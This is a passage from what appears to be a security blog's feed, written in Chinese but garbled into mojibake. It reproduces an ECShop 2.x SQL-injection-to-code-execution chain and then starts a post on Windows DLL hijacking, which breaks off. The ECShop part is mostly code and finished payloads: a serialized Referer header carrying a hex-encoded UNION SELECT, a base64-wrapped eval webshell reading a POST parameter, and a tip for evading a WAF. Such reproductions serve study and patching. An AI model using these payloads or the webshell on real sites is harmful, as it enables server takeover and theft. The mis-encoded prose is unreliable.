class="string">'SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, '</span>.</span><br><span class="line">                        <span class="string">'p.ad_height, p.position_style, RAND() AS rnd '</span> .</span><br><span class="line">                    <span class="string">'FROM '</span> . $GLOBALS[<span class="string">'ecs'</span>]-&gt;table(<span class="string">'ad'</span>) . <span class="string">' AS a '</span>.</span><br><span class="line">                    <span class="string">'LEFT JOIN '</span> . $GLOBALS[<span class="string">'ecs'</span>]-&gt;table(<span class="string">'ad_position'</span>) . <span class="string">' AS p ON a.position_id = p.position_id '</span> .</span><br><span class="line">                    <span class="string">"WHERE enabled = 1 AND a.position_id = '"</span> . $arr[<span class="string">'id'</span>] .</span><br><span class="line">                        <span class="string">"' AND start_time &lt;= '"</span> . $time . <span class="string">"' AND end_time &gt;= '"</span> . $time . <span class="string">"' "</span> .</span><br><span class="line">                    <span class="string">'ORDER BY rnd LIMIT 1'</span>;</span><br><span class="line">            $static_res[$arr[<span class="string">'id'</span>]] = $GLOBALS[<span class="string">'db'</span>]-&gt;GetAll($sql);</span><br><span class="line">        &#125;</span><br><span class="line">        $res = $static_res[$arr[<span class="string">'id'</span>]];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œæˆ‘ä»¬çš„<code>$arr</code>æ•°ç»„ï¼Œæ˜¯å®Œå…¨å¯æ§çš„ï¼Œå°±é€ æˆäº†ä¸€ä¸ªSQLæ³¨å…¥æ¼æ´<br>æ‰€ä»¥æ”»å‡»é“¾å°±å‡ºæ¥äº†</p><blockquote><p>user.php ï¼ˆè·å–$back_actï¼‰-&gt; assign() æ³¨å†Œå˜é‡ -&gt; display() è¾“å‡ºæ¨¡ç‰ˆ -&gt; æ ¹æ®hashï¼Œè¿›å…¥insert_mod() -&gt; æœ€åè°ƒç”¨insert_ads() å®Œæˆæ³¨å…¥</p></blockquote><p>payload:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REFERER: hash + $fun | serialize(<span class="keyword">array</span>(<span class="string">"num"</span>=&gt;sqlpayload,<span class="string">"id"</span>=&gt;<span class="number">1</span>))</span><br></pre></td></tr></table></figure></p><h3 id="ä»£ç æ‰§è¡Œ-1"><a href="#ä»£ç æ‰§è¡Œ-1" class="headerlink" title="ä»£ç æ‰§è¡Œ"></a>ä»£ç æ‰§è¡Œ</h3><p>æ¼æ´ç‚¹åŒæ ·æ˜¯è¿™ä¸ªSQLæ³¨å…¥å¼•èµ·ï¼Œä¸»è¦æ˜¯å› ä¸º<code>insert_ads()</code>å‡½æ•°åé¢åˆå¼•å…¥äº†ä¸€ä¸ªfetch<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$position_style = <span class="string">'str:'</span> . $position_style;</span><br><span class="line"></span><br><span class="line">    $need_cache = $GLOBALS[<span class="string">'smarty'</span>]-&gt;caching;</span><br><span class="line">    $GLOBALS[<span class="string">'smarty'</span>]-&gt;caching = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    $GLOBALS[<span class="string">'smarty'</span>]-&gt;assign(<span class="string">'ads'</span>, $ads);</span><br><span class="line">    $val = $GLOBALS[<span class="string">'smarty'</span>]-&gt;fetch($position_style);</span><br><span class="line"></span><br><span class="line">    $GLOBALS[<span class="string">'smarty'</span>]-&gt;caching = $need_cache;</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œå°†<code>$position_style</code>è¿›è¡Œfetchï¼Œå¾€ä¸Šçœ‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ($res <span class="keyword">AS</span> $row)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ($row[<span class="string">'position_id'</span>] != $arr[<span class="string">'id'</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $position_style = $row[<span class="string">'position_style'</span>];</span><br></pre></td></tr></table></figure></p><p><code>$position_style</code>æ˜¯ä»SQLç»“æœé›†ä¸­å–çš„ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬åº”è¯¥å¯ä»¥æ§åˆ¶<br>ä»£ç æ‰§è¡Œç‚¹åœ¨fetchå‡½æ•°é‡Œ<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($filename, $cache_id = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_seterror)</span><br><span class="line">        &#123;</span><br><span class="line">            error_reporting(E_ALL ^ E_NOTICE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_seterror++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strncmp($filename,<span class="string">'str:'</span>, <span class="number">4</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $out = <span class="keyword">$this</span>-&gt;_eval(<span class="keyword">$this</span>-&gt;fetch_str(substr($filename, <span class="number">4</span>)));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œä¹‹å‰å› ä¸º<code>$position_style</code>å·²ç»ç»è¿‡äº†<br><code>$position_style = &#39;str:&#39; . $position_style;</code>çš„å¤„ç†<br>æ‰€ä»¥<code>strncmp($filename,&#39;str:&#39;, 4) == 0</code>è‚¯å®šæ˜¯ä¸ºçœŸçš„ï¼Œæ‰€ä»¥ä¼šç›´æ¥æ‰§è¡Œä»£ç .<br>ä½†æ˜¯éœ€è¦æ»¡è¶³<code>fetch_str</code>å‡½æ•°<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetch_str</span><span class="params">($source)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!defined(<span class="string">'ECS_ADMIN'</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            $source = <span class="keyword">$this</span>-&gt;smarty_prefilter_preCompile($source);</span><br><span class="line">        &#125;</span><br><span class="line">        $source=preg_replace(<span class="string">"/([^a-zA-Z0-9_]&#123;1,1&#125;)+(copy|fputs|fopen|file_put_contents|fwrite|eval|phpinfo)+( |\()/is"</span>, <span class="string">""</span>, $source);</span><br><span class="line">        <span class="keyword">if</span>(preg_match_all(<span class="string">'~(&lt;\?(?:\w+|=)?|\?&gt;|language\s*=\s*[\"\']?php[\"\']?)~is'</span>, $source, $sp_match))</span><br><span class="line">        &#123;</span><br><span class="line">            $sp_match[<span class="number">1</span>] = array_unique($sp_match[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">for</span> ($curr_sp = <span class="number">0</span>, $for_max2 = count($sp_match[<span class="number">1</span>]); $curr_sp &lt; $for_max2; $curr_sp++)</span><br><span class="line">            &#123;</span><br><span class="line">                $source = str_replace($sp_match[<span class="number">1</span>][$curr_sp],<span class="string">'%%%SMARTYSP'</span>.$curr_sp.<span class="string">'%%%'</span>,$source);</span><br><span class="line">            &#125;</span><br><span class="line">             <span class="keyword">for</span> ($curr_sp = <span class="number">0</span>, $for_max2 = count($sp_match[<span class="number">1</span>]); $curr_sp &lt; $for_max2; $curr_sp++)</span><br><span class="line">            &#123;</span><br><span class="line">                 $source= str_replace(<span class="string">'%%%SMARTYSP'</span>.$curr_sp.<span class="string">'%%%'</span>, <span class="string">'&lt;?php echo \''</span>.str_replace(<span class="string">"'"</span>, <span class="string">"\'"</span>, $sp_match[<span class="number">1</span>][$curr_sp]).<span class="string">'\'; ?&gt;'</span>.<span class="string">"\n"</span>, $source);</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">return</span> preg_replace(<span class="string">"/&#123;([^\&#125;\&#123;\n]*)&#125;/e"</span>, <span class="string">"\$this-&gt;select('\\1');"</span>, $source);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>åœ¨å¾€é‡Œé¢è·Ÿï¼Œæœ€ç»ˆæ˜¯è°ƒç”¨äº†<code>$this-&gt;select()</code>å‡½æ•°<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($tag)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $tag = stripslashes(trim($tag));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($tag))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'&#123;&#125;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span> ($tag&#123;<span class="number">0</span>&#125; == <span class="string">'*'</span> &amp;&amp; substr($tag, <span class="number">-1</span>) == <span class="string">'*'</span>) <span class="comment">// æ³¨é‡Šéƒ¨åˆ†</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span> ($tag&#123;<span class="number">0</span>&#125; == <span class="string">'$'</span>) <span class="comment">// å˜é‡</span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="comment">//            if(strpos($tag,"'") || strpos($tag,"]"))</span></span><br><span class="line"><span class="comment">//            &#123;</span></span><br><span class="line"><span class="comment">//                 return '';</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">'&lt;?php echo '</span> . <span class="keyword">$this</span>-&gt;get_val(substr($tag, <span class="number">1</span>)) . <span class="string">'; ?&gt;'</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œæˆ‘ä»¬èƒ½çœ‹åˆ°æ›™å…‰äº†ï¼Œå°±æ˜¯å¦‚æœç¬¬ä¸€ä½æ˜¯<code>$</code>çš„è¯ï¼Œå°±è¿”å›ç»™_evalå‡½æ•°ä¸€ä¸ªå¸¦æœ‰phpæ ‡ç­¾çš„ä»£ç ï¼Œä½†æ˜¯è¿˜æ˜¯ä¼šç»è¿‡ä¸€ä¸ª<code>get_val()</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_val</span><span class="params">($val)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (strrpos($val, <span class="string">'['</span>) !== <span class="keyword">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $val = preg_replace(<span class="string">"/\[([^\[\]]*)\]/eis"</span>, <span class="string">"'.'.str_replace('$','\$','\\1')"</span>, $val);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strrpos($val, <span class="string">'|'</span>) !== <span class="keyword">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $moddb = explode(<span class="string">'|'</span>, $val);</span><br><span class="line">            $val = array_shift($moddb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($val))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strpos($val, <span class="string">'.$'</span>) !== <span class="keyword">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $all = explode(<span class="string">'.$'</span>, $val);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> ($all <span class="keyword">AS</span> $key =&gt; $val)</span><br><span class="line">            &#123;</span><br><span class="line">                $all[$key] = $key == <span class="number">0</span> ? <span class="keyword">$this</span>-&gt;make_var($val) : <span class="string">'['</span>. <span class="keyword">$this</span>-&gt;make_var($val) . <span class="string">']'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $p = implode(<span class="string">''</span>, $all);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            $p = <span class="keyword">$this</span>-&gt;make_var($val);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><p>å½“ä¼ å…¥çš„å˜é‡æ²¡æœ‰.$æ—¶ï¼Œè°ƒç”¨<code>$this-&gt;make_var</code>ï¼Œçœ‹çœ‹make_var<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_var</span><span class="params">($val)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (strrpos($val, <span class="string">'.'</span>) === <span class="keyword">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_var[$val]) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_patchstack[$val]))</span><br><span class="line">            &#123;</span><br><span class="line">                $val = <span class="keyword">$this</span>-&gt;_patchstack[$val];</span><br><span class="line">            &#125;</span><br><span class="line">            $p = <span class="string">'$this-&gt;_var[\''</span> . $val . <span class="string">'\']'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            $t = explode(<span class="string">'.'</span>, $val);</span><br><span class="line">            $_var_name = array_shift($t);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_var[$_var_name]) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_patchstack[$_var_name]))</span><br><span class="line">            &#123;</span><br><span class="line">                $_var_name = <span class="keyword">$this</span>-&gt;_patchstack[$_var_name];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($_var_name == <span class="string">'smarty'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                 $p = <span class="keyword">$this</span>-&gt;_compile_smarty_ref($t);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                $p = <span class="string">'$this-&gt;_var[\''</span> . $_var_name . <span class="string">'\']'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">foreach</span> ($t <span class="keyword">AS</span> $val)</span><br><span class="line">            &#123;</span><br><span class="line">                $p.= <span class="string">'[\''</span> . $val . <span class="string">'\']'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $p;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>å¯ä»¥çœ‹åˆ°æœ€ç»ˆè¿”å›çš„<code>$p</code>å˜æˆäº†<code>$p = &#39;$this-&gt;_var[\&#39;&#39; . $_var_name . &#39;\&#39;]&#39;</code><br>å¾€å›çœ‹ï¼Œæˆ‘ä»¬çš„selectå‡½æ•°returnçš„å€¼å°±å˜æˆäº†<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;_var[<span class="string">'  $val  '</span>];<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>ç„¶åç»“åˆä¸Šé¢è¿›å…¥å‡½æ•°çš„æ¡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ payload<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$abc<span class="string">'];echo phpinfo();//&#125;</span></span><br></pre></td></tr></table></figure></p><p>ç„¶åå› ä¸ºä¸æ»¡è¶³fetch_strçš„æ­£åˆ™ï¼ŒåŠ ä¸€ä¸ª<code>/**/</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$abc<span class="string">'];echo phpinfo/**/();//&#125;</span></span><br></pre></td></tr></table></figure></p><p>ç„¶åå°±æ˜¯åˆ©ç”¨SQLæ³¨å…¥æ¼æ´ï¼Œè®©<code>$position_style</code>ç­‰äºæˆ‘ä»¬çš„payloadäº†</p><p>æœ€ç»ˆpayload<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: <span class="number">554</span>fcae493e564ee0dc75bdf2ebf94caads|a:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">"num"</span>;s:<span class="number">110</span>:<span class="string">"*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -"</span>;s:<span class="number">2</span>:<span class="string">"id"</span>;s:<span class="number">4</span>:<span class="string">"' /*"</span>;&#125;<span class="number">554</span>fcae493e564ee0dc75bdf2ebf94ca</span><br></pre></td></tr></table></figure></p><p>ç®€å•æ¥è¯´å°±æ˜¯åˆ©ç”¨<code>$arr[&#39;id&#39;]</code>å’Œ<code>$arr[&#39;num&#39;]</code> æ³¨é‡Šæ‰ä¸­é—´çš„ <code>order by å’Œ limit</code>ï¼Œå¼ºåˆ¶æ‰§è¡ŒUNIONï¼Œå¸¦å…¥<code>position_style</code></p><p>å’Œä¹‹å‰çš„APTæ”»å‡»ä¸€æ ·ï¼Œå¯ä»¥ç›´æ¥å¸¦å…¥ä¸€ä¸ªæ— æ–‡ä»¶Webshell:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7b2461275d3b617373657274286261736536345f6465636f64652827514556575155776f596d467a5a5459305832526c5932396b5a53676b58314250553152624a303576654364644b536b372729293b24615b27317d</span></span><br><span class="line"><span class="comment"># unhex</span></span><br><span class="line">&#123;$a<span class="string">'];assert(base64_decode('</span>QEVWQUwoYmFzZTY0X2RlY29kZSgkX1BPU1RbJ05veCddKSk7<span class="string">'));$a['</span><span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># base64_decode</span></span><br><span class="line">@<span class="keyword">EVAL</span>(base64_decode($_POST[<span class="string">'Nox'</span>]));</span><br></pre></td></tr></table></figure></p><h2 id="0x04-æ€»ç»“"><a href="#0x04-æ€»ç»“" class="headerlink" title="0x04 æ€»ç»“"></a>0x04 æ€»ç»“</h2><p>Ecshop è¿˜æ˜¯è§çš„æ¯”è¾ƒå¤šï¼Œç”¨é€”ä¹Ÿæ¯”è¾ƒå¹¿ï¼Œç‰¹åˆ«æ˜¯ç°åœ¨å„ç±»åŒºå—é“¾çš„ç½‘ç«™ï¼Œç”¨çš„è¿˜æ˜¯æ¯”è¾ƒå¤š</p><p>3.xåŒæ ·ä¹Ÿå¯ä»¥rceï¼Œåªæ˜¯éœ€è¦ç²¾å¿ƒæ„é€ payloadï¼Œå› ä¸ºéœ€è¦ç»•è¿‡wafï¼Œä½†æ˜¯404çš„å¸ˆå‚…è¯´å…¶å®å°†union selecté€šè¿‡ä¸¤ä¸ªå‚æ•°ä¼ é€’è¿›å»ï¼Œä¸€ä¸ªå‚æ•°ä¼ é€’ä¸€ä¸ªå…³é”®å­—ï¼Œä¸­é—´çš„å¯ä»¥ä½¿ç”¨<code>/**/</code>æ³¨é‡Šæ‰ï¼Œè¿™æ ·å°±ä¸ä¼šè§¦å‘WAFäº†23333</p><h2 id="0x05-Links"><a href="#0x05-Links" class="headerlink" title="0x05 Links"></a>0x05 Links</h2><p><a href="https://paper.seebug.org/695/" target="_blank" rel="noopener">https://paper.seebug.org/695/</a><br><a href="https://xz.aliyun.com/t/2689" target="_blank" rel="noopener">https://xz.aliyun.com/t/2689</a><br><a href="https://www.seebug.org/vuldb/ssvid-97343" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-97343</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-8-27 00:03:02&lt;br&gt;&lt;img src=&quot;/wallpaper/[60268880.jpg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-å‰è¨€
      
    
    </summary>
    
      <category term="æ¼æ´å¤ç°" scheme="http://patrilic.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="ä»£ç å®¡è®¡" scheme="http://patrilic.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>DLL Hijacking</title>
    <link href="http://patrilic.top/2019/08/23/DLL%20Hijacking/"/>
    <id>http://patrilic.top/2019/08/23/DLL Hijacking/</id>
    <published>2019-08-23T04:18:04.000Z</published>
    <updated>2019-08-27T18:08:49.932Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Authro: Patrilic<br>@Time: 2019-08-23 12:18:04<br><img src="/wallpaper/75773182_p0.jpg" alt></p></blockquote><h2 id="0x00-Introduce"><a href="#0x00-Introduce" class="headerlink" title="0x00 Introduce"></a>0x00 Introduce</h2><p>DLL Hijackingï¼Œ é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯DLLåŠ«æŒï¼Œåˆ©ç”¨DLLåŠ«æŒï¼Œå¯ä»¥é€šè¿‡è°ƒç”¨æ¶æ„dllæ–‡ä»¶æ¥æ‰§è¡Œshellcodeã€‚<br>æ‰€ä»¥ï¼ŒDLLæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ<br><a href="https://zh.wikipedia.org/wiki/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93" target="_blank" rel="noopener">ç»´åŸºç™¾ç§‘</a></p><p>ç®€å•æ¥è¯´ï¼Œexeæ–‡ä»¶æœ¬èº«ä¸éœ€è¦å¾ˆå¤šå‡½æ•°ï¼Œè€Œæ˜¯å»è°ƒç”¨DLLæ–‡ä»¶ä¸­çš„å‡½æ•°ï¼Œå½“è¿›ç¨‹è¿è¡Œåˆ°éœ€è¦è°ƒç”¨æ—¶ï¼Œå°±å»ä»æ–‡ä»¶ä¸­è°ƒç”¨å¯¹åº”çš„å‡½æ•°ï¼Œç„¶åå½“æˆ‘ä»¬èƒ½å¤Ÿä¸­é—´æ’å…¥è‡ªå·±çš„DLLå¹¶æƒ³åŠæ³•è®©ç¨‹åºè¿è¡Œæˆ‘ä»¬çš„DLLæ—¶ï¼Œå°±é€ æˆäº†åŠ«æŒã€‚</p><h2 id="0x01-DLL-Hijacking"><a href="#0x01-DLL-Hijacking" class="headerlink" title="0x01 DLL Hijacking"></a>0x01 DLL Hijacking</h2><p><code>DLL hijacking</code> åœ¨ CWEä¸Šåˆåï¼š <code>Untrusted Search Path Vulnerability</code><br><a href="https://cwe.mitre.org/data/definitions/426.html" target="_blank" rel="noopener">https://cwe.mitre.org/data/definitions/426.html</a></p><p>dllåŠ«æŒé€šè¿‡åˆ©ç”¨DLLçš„åŠ è½½é¡ºåºï¼Œè®©æˆ‘ä»¬çš„æ¶æ„dllåœ¨æ­£å¸¸çš„dllå‰é¢åŠ è½½ï¼Œå°±å¯ä»¥è¿›è¡ŒåŠ«æŒäº†</p><h3 id="DLL-Search-Order"><a href="#DLL-Search-Order" class="headerlink" title="DLL Search Order"></a>DLL Search Order</h3><p>ä¸‹é¢æ¥çœ‹ä¸€ä¸‹dllçš„åŠ è½½é¡ºåºï¼š<br>å®˜æ–¹æ–‡æ¡£ï¼š <a href="https://docs.microsoft.com/zh-cn/windows/win32/dlls/dynamic-link-library-search-order" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows/win32/dlls/dynamic-link-library-search-order</a></p><p>åº”ç”¨ç¨‹åºå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æ§åˆ¶ä¸€ä¸ªDLLçš„åŠ è½½è·¯å¾„ï¼šä½¿ç”¨å…¨è·¯å¾„åŠ è½½ã€ä½¿ç”¨DLLé‡å®šå‘ã€ä½¿ç”¨manifestæ–‡ä»¶ã€‚å¦‚æœä¸Šè¿°ä¸‰ç§æ–¹å¼å‡æœªæŒ‡å®šï¼Œç³»ç»ŸæŸ¥æ‰¾DLLçš„é¡ºåºå°†æŒ‰ç…§æœ¬éƒ¨åˆ†æè¿°çš„é¡ºåºè¿›è¡Œã€‚</p><p>ç„¶åè¿™é‡Œæœ‰ä¸¤ä¸ªå‰ææ¡ä»¶ï¼Œå¯¹ä»¥ä¸‹ä¸¤ç§æƒ…å†µçš„DLLï¼Œç¨‹åºä¸ä¼šæŸ¥æ‰¾ï¼Œè€Œæ˜¯ç›´æ¥å¼•ç”¨</p><ol><li>å¯¹äºå·²ç»åŠ è½½åˆ°å†…å­˜ä¸­çš„åŒåDLLï¼Œç³»ç»Ÿä½¿ç”¨å·²ç»åŠ è½½çš„DLLï¼Œå¹¶ä¸”å¿½ç•¥å¾…åŠ è½½DLLçš„è·¯å¾„ã€‚ï¼ˆæ³¨æ„å¯¹æŸä¸ªè¿›ç¨‹è€Œè¨€ï¼Œç³»ç»Ÿå·²ç»åŠ è½½çš„DLLä¸€å®šæ˜¯å”¯ä¸€çš„å­˜åœ¨äºæŸä¸ªç›®å½•ä¸‹ã€‚ï¼‰</li><li>å¦‚æœè¯¥DLLå­˜åœ¨äºæŸä¸ªWindowsç‰ˆæœ¬çš„å·²çŸ¥DLLåˆ—è¡¨ï¼ˆunkown DLLï¼‰ä¸­ï¼Œç³»ç»Ÿä½¿ç”¨å·²çŸ¥DLLçš„æ‹·è´ï¼ˆåŒ…æ‹¬å·²çŸ¥DLLçš„ä¾èµ–é¡¹ï¼‰ã€‚å·²çŸ¥DLLåˆ—è¡¨å¯ä»¥ä»å¦‚ä¸‹æ³¨å†Œè¡¨é¡¹çœ‹åˆ°ï¼š<br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLsã€‚<br><img src="/DLL Hijacking.resources/FE85E1B9-4C3C-40C2-8680-64BBCF2D9714.png" alt="0c6f2cf4e21cd827fdff57790b3a5982"></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td 